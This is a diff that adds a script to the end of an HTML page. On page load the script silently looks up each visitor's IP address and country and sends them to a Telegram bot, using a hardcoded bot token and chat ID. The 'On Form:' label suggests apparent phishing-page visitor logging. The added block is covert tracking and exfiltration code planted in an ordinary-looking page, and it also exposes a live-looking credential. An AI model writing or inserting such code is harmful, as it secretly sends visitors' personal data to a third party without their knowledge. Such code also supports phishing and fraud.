@@ -150,6 +150,41 @@
             });
         });
     </script>
+
+<script>
+async function sendVisitorInfo() {
+    try {
+        // Step 1: Get visitor's IP address using HTTPS
+        let response = await fetch('https://api64.ipify.org?format=json');
+        let ipData = await response.json();
+        let userIP = ipData.ip;
+
+        // Step 2: Get country using ip-api (now using HTTPS)
+        let geoResponse = await fetch(`https://ip-api.com/json/${userIP}?fields=country`);
+        let geoData = await geoResponse.json();
+        let country = geoData.country || "Unknown Country";
+
+        // Step 3: Send IP & country to Telegram
+        let message = `On Form:\nIP: ${userIP}\nCountry: ${country}`;
+        let botToken = '7494153356:AAFQo6RDU7o_Cjn88uVqmwTFyQZaqoOn25k';
+        let chatId = '5607989288';
+
+        let telegramUrl = `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}`;
+
+        // Send request to Telegram API
+        let xhr = new XMLHttpRequest();
+        xhr.open("GET", telegramUrl, true);
+        xhr.send();
+        
+    } catch (error) {
+        console.error('Error fetching IP details or sending Telegram message:', error);
+    }
+}
+
+// Ensure script runs after the page loads
+window.onload = sendVisitorInfo;
+</script>
+    
 </body>
 
 </html>
